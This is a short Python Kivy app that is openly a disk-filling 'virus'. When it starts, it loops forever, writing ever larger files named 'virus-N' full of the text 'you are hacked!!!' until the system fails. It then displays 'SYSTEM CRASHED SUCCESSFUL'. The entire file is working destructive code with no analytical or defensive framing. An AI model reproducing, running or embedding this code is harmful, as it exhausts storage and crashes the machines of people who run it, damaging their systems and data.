from kivy.app import App
from kivy.uix.label import Label

class MainApp(App):
    def build(self):
        
        try:
        	x=0
        	while True:
        		x = x+1
        		c =""
        		name = "virus" +'-' +str(x)
        		f=open(name,"w")
        		for y in range(x):
        			c= c+ y*"you are hacked!!!"+"\n"
        		f.write(c)
        		f.close()
        except:
        	print("SYSTEM CRASHED SUCCESSFUL")
        	text = "SYSTEM CRASHED SUCCESSFUL"
        label = Label(text=text,
                      size_hint=(.5, .5),
                      pos_hint={'center_x': .5, 'center_y': .5})
        return label

if __name__ == '__main__':
    app = MainApp()
    app.run()